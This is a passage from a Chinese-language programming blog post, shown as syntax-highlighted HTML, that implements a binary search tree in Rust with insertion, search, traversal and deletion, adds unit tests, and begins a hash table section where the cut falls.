keyword">if</span> value <span class="token operator">==</span> <span class="token keyword">self</span><span class="token punctuation">.</span>value <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token keyword">if</span> value <span class="token operator">></span> <span class="token keyword">self</span><span class="token punctuation">.</span>value <span class="token punctuation">&#123;</span>            <span class="token keyword">match</span> <span class="token keyword">self</span><span class="token punctuation">.</span>right<span class="token punctuation">&#123;</span>                <span class="token class-name">Some</span><span class="token punctuation">(</span><span class="token keyword">ref</span> <span class="token keyword">mut</span> node<span class="token punctuation">)</span> <span class="token operator">=></span> node<span class="token punctuation">.</span><span class="token function">insert</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span><span class="token punctuation">,</span>                <span class="token class-name">None</span> <span class="token operator">=></span> <span class="token keyword">self</span><span class="token punctuation">.</span>right <span class="token operator">=</span> <span class="token class-name">Some</span><span class="token punctuation">(</span><span class="token class-name">Box</span><span class="token punctuation">::</span><span class="token function">new</span><span class="token punctuation">(</span><span class="token class-name">Node</span><span class="token punctuation">&#123;</span>value <span class="token punctuation">:</span> value<span class="token punctuation">,</span> left <span class="token punctuation">:</span> <span class="token class-name">None</span><span class="token punctuation">,</span> right <span class="token punctuation">:</span> <span class="token class-name">None</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>            <span class="token keyword">match</span> <span class="token keyword">self</span><span class="token punctuation">.</span>left<span class="token punctuation">&#123;</span>                <span class="token class-name">Some</span><span class="token punctuation">(</span><span class="token keyword">ref</span> <span class="token keyword">mut</span> node<span class="token punctuation">)</span> <span class="token operator">=></span> node<span class="token punctuation">.</span><span class="token function">insert</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span><span class="token punctuation">,</span>                <span class="token class-name">None</span> <span class="token operator">=></span> <span class="token keyword">self</span><span class="token punctuation">.</span>left <span class="token operator">=</span> <span class="token class-name">Some</span><span class="token punctuation">(</span><span class="token class-name">Box</span><span class="token punctuation">::</span><span class="token function">new</span><span class="token punctuation">(</span><span class="token class-name">Node</span><span class="token punctuation">&#123;</span>value <span class="token punctuation">:</span> value<span class="token punctuation">,</span> left <span class="token punctuation">:</span> <span class="token class-name">None</span><span class="token punctuation">,</span> right <span class="token punctuation">:</span> <span class="token class-name">None</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">fn</span> <span class="token function-definition function">search</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token keyword">self</span><span class="token punctuation">,</span> target <span class="token punctuation">:</span> <span class="token keyword">i32</span><span class="token punctuation">,</span> depth <span class="token punctuation">:</span> <span class="token keyword">usize</span><span class="token punctuation">)</span> <span class="token punctuation">-></span> <span class="token punctuation">(</span><span class="token class-name">Option</span><span class="token operator">&lt;</span><span class="token keyword">bool</span><span class="token operator">></span><span class="token punctuation">,</span><span class="token keyword">usize</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>         <span class="token keyword">match</span> <span class="token keyword">self</span><span class="token punctuation">.</span>value <span class="token punctuation">&#123;</span>            val <span class="token keyword">if</span> val <span class="token operator">==</span> target <span class="token operator">=></span> <span class="token punctuation">(</span><span class="token class-name">Some</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">,</span>depth<span class="token punctuation">)</span><span class="token punctuation">,</span>            val <span class="token keyword">if</span> val <span class="token operator">&lt;</span> target <span class="token operator">=></span> <span class="token punctuation">&#123;</span>                <span class="token comment">// 去右子树找</span>                <span class="token keyword">match</span> <span class="token keyword">self</span><span class="token punctuation">.</span>right <span class="token punctuation">&#123;</span>                    <span class="token class-name">Some</span><span class="token punctuation">(</span><span class="token keyword">ref</span> node<span class="token punctuation">)</span> <span class="token operator">=></span> node<span class="token punctuation">.</span><span class="token function">search</span><span class="token punctuation">(</span>target<span class="token punctuation">,</span> depth <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                    <span class="token class-name">None</span> <span class="token operator">=></span> <span class="token punctuation">(</span><span class="token class-name">Some</span><span class="token punctuation">(</span><span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">,</span>depth<span class="token punctuation">)</span>                <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span>            val <span class="token keyword">if</span> val <span class="token operator">></span> target <span class="token operator">=></span> <span class="token punctuation">&#123;</span>                <span class="token comment">// 去左子树找</span>                <span class="token keyword">match</span> <span class="token keyword">self</span><span class="token punctuation">.</span>left <span class="token punctuation">&#123;</span>                    <span class="token class-name">Some</span><span class="token punctuation">(</span><span class="token keyword">ref</span> node<span class="token punctuation">)</span> <span class="token operator">=></span> node<span class="token punctuation">.</span><span class="token function">search</span><span class="token punctuation">(</span>target<span class="token punctuation">,</span> depth <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                    <span class="token class-name">None</span> <span class="token operator">=></span> <span class="token punctuation">(</span><span class="token class-name">Some</span><span class="token punctuation">(</span><span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">,</span>depth<span class="token punctuation">)</span>                <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span>            _ <span class="token operator">=></span> <span class="token punctuation">(</span><span class="token class-name">None</span><span class="token punctuation">,</span>depth<span class="token punctuation">)</span><span class="token punctuation">,</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">fn</span> <span class="token function-definition function">print</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token keyword">self</span><span class="token punctuation">,</span> depth <span class="token punctuation">:</span> <span class="token keyword">usize</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token keyword">let</span> <span class="token class-name">Some</span><span class="token punctuation">(</span>r<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token operator">&amp;</span><span class="token keyword">self</span><span class="token punctuation">.</span>right <span class="token punctuation">&#123;</span>            r<span class="token punctuation">.</span><span class="token function">print</span><span class="token punctuation">(</span>depth <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">let</span> spaces <span class="token operator">=</span> <span class="token string">" "</span><span class="token punctuation">.</span><span class="token function">repeat</span><span class="token punctuation">(</span>depth <span class="token operator">*</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token macro property">println!</span><span class="token punctuation">(</span><span class="token string">"&#123;&#125;&#123;&#125;"</span><span class="token punctuation">,</span> spaces<span class="token punctuation">,</span> <span class="token keyword">self</span><span class="token punctuation">.</span>value<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token keyword">let</span> <span class="token class-name">Some</span><span class="token punctuation">(</span>l<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token operator">&amp;</span><span class="token keyword">self</span><span class="token punctuation">.</span>left <span class="token punctuation">&#123;</span>            l<span class="token punctuation">.</span><span class="token function">print</span><span class="token punctuation">(</span>depth <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">fn</span> <span class="token function-definition function">pre_order_traverse</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token keyword">self</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token macro property">println!</span><span class="token punctuation">(</span><span class="token string">"&#123;&#125;"</span><span class="token punctuation">,</span><span class="token keyword">self</span><span class="token punctuation">.</span>value<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token keyword">let</span> <span class="token class-name">Some</span><span class="token punctuation">(</span>l<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token operator">&amp;</span><span class="token keyword">self</span><span class="token punctuation">.</span>left <span class="token punctuation">&#123;</span>            l<span class="token punctuation">.</span><span class="token function">pre_order_traverse</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">if</span> <span class="token keyword">let</span> <span class="token class-name">Some</span><span class="token punctuation">(</span>r<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token operator">&amp;</span><span class="token keyword">self</span><span class="token punctuation">.</span>right <span class="token punctuation">&#123;</span>            r<span class="token punctuation">.</span><span class="token function">pre_order_traverse</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">fn</span> <span class="token function-definition function">in_order_traverse</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token keyword">self</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token keyword">let</span> <span class="token class-name">Some</span><span class="token punctuation">(</span>l<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token operator">&amp;</span><span class="token keyword">self</span><span class="token punctuation">.</span>left <span class="token punctuation">&#123;</span>            l<span class="token punctuation">.</span><span class="token function">in_order_traverse</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token macro property">println!</span><span class="token punctuation">(</span><span class="token string">"&#123;&#125;"</span><span class="token punctuation">,</span><span class="token keyword">self</span><span class="token punctuation">.</span>value<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token keyword">let</span> <span class="token class-name">Some</span><span class="token punctuation">(</span>r<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token operator">&amp;</span><span class="token keyword">self</span><span class="token punctuation">.</span>right <span class="token punctuation">&#123;</span>            r<span class="token punctuation">.</span><span class="token function">in_order_traverse</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">fn</span> <span class="token function-definition function">delete</span><span class="token punctuation">(</span>root<span class="token punctuation">:</span> <span class="token class-name">Option</span><span class="token operator">&lt;</span><span class="token class-name">Box</span><span class="token operator">&lt;</span><span class="token class-name">Node</span><span class="token operator">>></span><span class="token punctuation">,</span> target <span class="token punctuation">:</span> <span class="token keyword">i32</span><span class="token punctuation">)</span> <span class="token punctuation">-></span> <span class="token class-name">Option</span><span class="token operator">&lt;</span><span class="token class-name">Box</span><span class="token operator">&lt;</span><span class="token class-name">Node</span><span class="token operator">>></span> <span class="token punctuation">&#123;</span>        <span class="token keyword">let</span> <span class="token keyword">mut</span> node <span class="token operator">=</span> root<span class="token operator">?</span><span class="token punctuation">;</span>        <span class="token keyword">let</span> v <span class="token operator">=</span> node<span class="token punctuation">.</span>value<span class="token punctuation">;</span>        <span class="token keyword">if</span> v <span class="token operator">&lt;</span> target <span class="token punctuation">&#123;</span>            node<span class="token punctuation">.</span>right <span class="token operator">=</span> <span class="token keyword">Self</span><span class="token punctuation">::</span><span class="token function">delete</span><span class="token punctuation">(</span>node<span class="token punctuation">.</span>right<span class="token punctuation">.</span><span class="token function">take</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> target<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">Some</span><span class="token punctuation">(</span>node<span class="token punctuation">)</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> v <span class="token operator">></span> target <span class="token punctuation">&#123;</span>            node<span class="token punctuation">.</span>left <span class="token operator">=</span> <span class="token keyword">Self</span><span class="token punctuation">::</span><span class="token function">delete</span><span class="token punctuation">(</span>node<span class="token punctuation">.</span>left<span class="token punctuation">.</span><span class="token function">take</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> target<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">Some</span><span class="token punctuation">(</span>node<span class="token punctuation">)</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> v <span class="token operator">==</span> target <span class="token punctuation">&#123;</span>            <span class="token keyword">match</span> <span class="token punctuation">(</span>node<span class="token punctuation">.</span>left<span class="token punctuation">.</span><span class="token function">take</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> node<span class="token punctuation">.</span>right<span class="token punctuation">.</span><span class="token function">take</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token comment">// 无子节点</span>                <span class="token punctuation">(</span><span class="token class-name">None</span><span class="token punctuation">,</span> <span class="token class-name">None</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token class-name">None</span><span class="token punctuation">,</span>                <span class="token comment">// 只有一个子节点</span>                <span class="token punctuation">(</span>left <span class="token operator">@</span> <span class="token class-name">Some</span><span class="token punctuation">(</span>_<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token class-name">None</span><span class="token punctuation">)</span> <span class="token operator">=></span> left<span class="token punctuation">,</span>                <span class="token punctuation">(</span><span class="token class-name">None</span><span class="token punctuation">,</span> right <span class="token operator">@</span> <span class="token class-name">Some</span><span class="token punctuation">(</span>_<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">=></span> right<span class="token punctuation">,</span>                <span class="token comment">// 有两个子节点可以用左子树的最大节点或右子树的最小节点替换，或者直接用左孩子替换再把右子树接到末尾</span>                <span class="token punctuation">(</span><span class="token class-name">Some</span><span class="token punctuation">(</span>left<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token class-name">Some</span><span class="token punctuation">(</span>right<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>                    <span class="token keyword">let</span> min_val <span class="token operator">=</span> <span class="token keyword">Self</span><span class="token punctuation">::</span><span class="token function">min_value</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>right<span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token keyword">let</span> <span class="token keyword">mut</span> new_node <span class="token operator">=</span> <span class="token class-name">Box</span><span class="token punctuation">::</span><span class="token function">new</span><span class="token punctuation">(</span><span class="token class-name">Node</span> <span class="token punctuation">&#123;</span>                        value<span class="token punctuation">:</span> min_val<span class="token punctuation">,</span>                        left<span class="token punctuation">:</span> <span class="token class-name">Some</span><span class="token punctuation">(</span>left<span class="token punctuation">)</span><span class="token punctuation">,</span>                        right<span class="token punctuation">:</span> <span class="token class-name">None</span><span class="token punctuation">,</span>                    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token comment">// 删除右子树中的最小节点</span>                    new_node<span class="token punctuation">.</span>right <span class="token operator">=</span> <span class="token keyword">Self</span><span class="token punctuation">::</span><span class="token function">delete</span><span class="token punctuation">(</span><span class="token class-name">Some</span><span class="token punctuation">(</span>right<span class="token punctuation">)</span><span class="token punctuation">,</span> min_val<span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token class-name">Some</span><span class="token punctuation">(</span>new_node<span class="token punctuation">)</span>                <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            <span class="token class-name">None</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">fn</span> <span class="token function-definition function">min_value</span><span class="token punctuation">(</span>node<span class="token punctuation">:</span> <span class="token operator">&amp;</span><span class="token class-name">Box</span><span class="token operator">&lt;</span><span class="token class-name">Node</span><span class="token operator">></span><span class="token punctuation">)</span> <span class="token punctuation">-></span> <span class="token keyword">i32</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">let</span> <span class="token keyword">mut</span> current <span class="token operator">=</span> node<span class="token punctuation">;</span>        <span class="token keyword">while</span> <span class="token keyword">let</span> <span class="token class-name">Some</span><span class="token punctuation">(</span>left<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token operator">&amp;</span>current<span class="token punctuation">.</span>left <span class="token punctuation">&#123;</span>            current <span class="token operator">=</span> left<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        current<span class="token punctuation">.</span>value    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>两层结构体，SearchTree对所有功能进行了一次封装</p><p>大部分实现都很常规，唯一麻烦的是删除操作，虽然递归的所有权问题很麻烦，但依然要比遍历看着简单</p><p>还有min_value也是一种妥协，如果要返回Option<Node>会遇到复杂的生命周期问题，所以就返回一个值用到再创建就好了</p><p>测试：<br><pre class="line-numbers language-rust" data-language="rust"><code class="language-rust"><span class="token attribute attr-name">#[cfg(test)]</span><span class="token keyword">mod</span> <span class="token module-declaration namespace">tests</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">use</span> <span class="token keyword">crate</span><span class="token punctuation">::</span><span class="token class-name">SearchTree</span><span class="token punctuation">;</span>    <span class="token comment">//#[test]</span>    <span class="token keyword">fn</span> <span class="token function-definition function">test_insert</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">let</span> <span class="token keyword">mut</span> tree <span class="token operator">=</span> <span class="token class-name">SearchTree</span><span class="token punctuation">::</span><span class="token function">new</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token macro property">assert_eq!</span><span class="token punctuation">(</span>tree<span class="token punctuation">.</span><span class="token function">search</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token class-name">Option</span><span class="token punctuation">::</span><span class="token class-name">None</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">let</span> nums <span class="token operator">=</span> <span class="token macro property">vec!</span><span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        tree<span class="token punctuation">.</span><span class="token function">build</span><span class="token punctuation">(</span>nums<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token macro property">assert_eq!</span><span class="token punctuation">(</span>tree<span class="token punctuation">.</span><span class="token function">search</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token class-name">Some</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token macro property">assert_eq!</span><span class="token punctuation">(</span>tree<span class="token punctuation">.</span><span class="token function">search</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token class-name">Some</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token macro property">assert_eq!</span><span class="token punctuation">(</span>tree<span class="token punctuation">.</span><span class="token function">search</span><span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token class-name">Some</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token macro property">assert_eq!</span><span class="token punctuation">(</span>tree<span class="token punctuation">.</span><span class="token function">search</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token class-name">Some</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token macro property">assert_eq!</span><span class="token punctuation">(</span>tree<span class="token punctuation">.</span><span class="token function">search</span><span class="token punctuation">(</span><span class="token number">33</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token class-name">Some</span><span class="token punctuation">(</span><span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">//#[test]</span>    <span class="token keyword">fn</span> <span class="token function-definition function">test_print</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">let</span> <span class="token keyword">mut</span> tree <span class="token operator">=</span> <span class="token class-name">SearchTree</span><span class="token punctuation">::</span><span class="token function">new</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">let</span> nums <span class="token operator">=</span> <span class="token macro property">vec!</span><span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        tree<span class="token punctuation">.</span><span class="token function">build</span><span class="token punctuation">(</span>nums<span class="token punctuation">)</span><span class="token punctuation">;</span>        tree<span class="token punctuation">.</span><span class="token function">traverse</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        tree<span class="token punctuation">.</span><span class="token function">print</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token attribute attr-name">#[test]</span>    <span class="token keyword">fn</span> <span class="token function-definition function">test_delete</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">let</span> <span class="token keyword">mut</span> tree <span class="token operator">=</span> <span class="token class-name">SearchTree</span><span class="token punctuation">::</span><span class="token function">new</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// 插入和搜索</span>        tree<span class="token punctuation">.</span><span class="token function">build</span><span class="token punctuation">(</span><span class="token macro property">vec!</span><span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token macro property">assert_eq!</span><span class="token punctuation">(</span>tree<span class="token punctuation">.</span><span class="token function">search</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token class-name">Some</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token macro property">assert_eq!</span><span class="token punctuation">(</span>tree<span class="token punctuation">.</span><span class="token function">search</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token class-name">Some</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token macro property">assert_eq!</span><span class="token punctuation">(</span>tree<span class="token punctuation">.</span><span class="token function">search</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token class-name">Some</span><span class="token punctuation">(</span><span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// 删除叶子节点</span>        tree<span class="token punctuation">.</span><span class="token function">delete</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">unwrap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token macro property">assert_eq!</span><span class="token punctuation">(</span>tree<span class="token punctuation">.</span><span class="token function">search</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token class-name">Some</span><span class="token punctuation">(</span><span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// 删除有一个子节点的节点</span>        tree<span class="token punctuation">.</span><span class="token function">delete</span><span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">unwrap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token macro property">assert_eq!</span><span class="token punctuation">(</span>tree<span class="token punctuation">.</span><span class="token function">search</span><span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token class-name">Some</span><span class="token punctuation">(</span><span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token macro property">assert_eq!</span><span class="token punctuation">(</span>tree<span class="token punctuation">.</span><span class="token function">search</span><span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token class-name">Some</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// 删除有两个子节点的节点</span>        tree<span class="token punctuation">.</span><span class="token function">delete</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">unwrap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token macro property">assert_eq!</span><span class="token punctuation">(</span>tree<span class="token punctuation">.</span><span class="token function">search</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token class-name">Some</span><span class="token punctuation">(</span><span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// 验证树仍然有效</span>        tree<span class="token punctuation">.</span><span class="token function">print</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        tree<span class="token punctuation">.</span><span class="token function">traverse</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p><h2 id="哈希表"><a href="#哈希表" class="headerlink" title="哈希表"></a>哈希表</h2><p>没规定哈希表的大小，凭直觉填45了</p><p>基本实现：<br><pre class="line-numbers language-rust" data-language="rust"><code class="language-rust"><span class="token keyword">use</span> <span class="token namespace">anyhow<span class="token punctuation">::</span></span><span class="token class-name">Result</span><span class="token punctuation">;</span><span class="token keyword">struct</span> <span class="token type-definition class-name">MyHash</span><span class="token punctuation">&#123;</span>    data <span class="token punctuation">:</span> <span class="token class-name">Vec</span><span class="token operator">&lt;</span><span class="token class-name">Option</span><span class="token operator">&lt;</span><span class="token class-name">String</span><span class="token operator">>></span><span class="token punctuation">,</span>    len <span class="token punctuation">:</span> <span class="token keyword">usize</span><span class="token punctuation">,</span><span class="token punctuation">&#125;</span><span class="token keyword">impl</span> <span class="token class-name">MyHash</span> <span 